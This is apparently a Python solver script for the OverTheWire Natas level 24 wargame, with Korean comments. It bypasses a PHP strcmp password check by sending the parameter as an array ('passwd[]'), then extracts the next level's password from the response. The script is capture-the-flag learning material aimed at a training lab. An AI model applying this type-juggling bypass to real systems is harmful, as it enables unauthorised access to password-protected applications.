import requests
import sys
import re

boundary = "=" * 65

# 해당 코드 파일 실행에 대한 예외 처리 
if len(sys.argv) != 2:
  print(boundary)
  print("[-] 실행 시, 비밀번호를 인자로 주지 않았습니다. 아래와 같은 포멧으로 실행해주세요")
  print(f"    python {sys.argv[0]} natas24_password")
  print(boundary)
  

url = "http://natas24.natas.labs.overthewire.org/"
natas24_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas24", natas24_cred)  

# 비밀번호에 해당하는 페이로드인 파라미터 이름을 password[]로 조작하여 요청
# password[] 배열 타입 데이터 -> null -> false -> NOt -> true 순서로 변경되어 조건 만족하게 됨
payload = {"passwd[]": ""}
response = s.get(url, params=payload)

# 비밀번호 정규식으로 검색 
password = re.search(r"Password:\s*(\w+)", response.text)

# 비밀번호 출력 및 예외처리
if password:
  print(boundary)
  print(f"[+] natas25 비밀번호 ====> {password.group(1)}")
  print(boundary)

else:
  print("[-] 아래 응답 전체 html 코드를 확인해주세요")
  print(response.text)
    
